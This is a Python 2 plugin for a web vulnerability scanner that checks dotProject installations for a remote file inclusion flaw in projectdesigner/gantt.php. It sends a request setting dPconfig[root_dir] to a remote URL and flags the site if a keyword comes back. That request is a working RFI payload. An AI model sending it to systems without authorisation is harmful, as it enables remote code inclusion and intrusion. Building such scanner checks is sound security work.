#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="dotproject/modules/projectdesigner/gantt.php?dPconfig[root_dir]=%s"%(ob['rfi_url'])
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)        
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        if content.find(ob['rfi_keyword'].encode('utf8'))>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:dotProjectincludefilescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dotProjectincludefilescript.py, run_domain function :" + str(e))
    return result